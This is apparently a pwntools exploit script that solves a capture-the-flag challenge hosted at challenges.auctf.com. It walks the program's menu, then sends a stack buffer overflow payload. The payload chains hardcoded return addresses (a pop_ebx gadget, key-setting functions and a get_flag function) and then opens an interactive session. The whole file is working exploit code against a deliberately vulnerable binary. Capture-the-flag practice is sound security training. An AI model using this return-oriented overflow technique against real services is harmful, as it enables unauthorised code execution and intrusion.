from pwn import *

BINARY = './challenge'
LIBC = './libc.so.6'
HOST = 'challenges.auctf.com'
PORT = 30012

elf = ELF(BINARY)
#libc = ELF('./libc.so.6')

context.terminal = ['tmux', 'split-w']


def get_base_address(proc):
        return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
        script = ""
        for bp in breakpoints:
                script += "b *0x%x\n"%(PIE+bp)
        gdb.attach(process(BINARY), gdbscript=script)

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)

p = start()
if args.GDB:
    gdb.attach(p, 'b *0x5655601e')

print(p.sendlineafter("Your choice", '2'))
print(p.sendlineafter("enter: ", '4'))
print(p.sendlineafter("choice: ", '3'))
print(p.sendlineafter("exit: ", 'Stephen'))

# gets libc
#gets 0x565565da
# key3 = 0x56559040
# key3 = 0x56557008
# hidden_room = 0x56559054
key3 = p32(0x56557008)
room4 = p32(0x56556580)
pop_ebx = p32(0x5655601e)
gets = p32(0x5655605b)
repair_frame = p32(0xffffd538)
feedc0de = p32(0xfeedc0de)
get_key1 = p32(0x565566de)
get_key2 = p32(0x5655676e)
set_key4 = p32(0x565567e9)
get_flag = p32(0x5655686b)
AAsDrwEk = p32(0x565567cd)

x = b"AAAAAAAAAABBBBBBBBBBCCCC"
x += b"AAAA"
x += AAsDrwEk
x += get_key2
x += get_key1
x += pop_ebx
x += feedc0de
x += set_key4
x += get_flag

print(p.sendlineafter("something: ", x))
p.interactive()
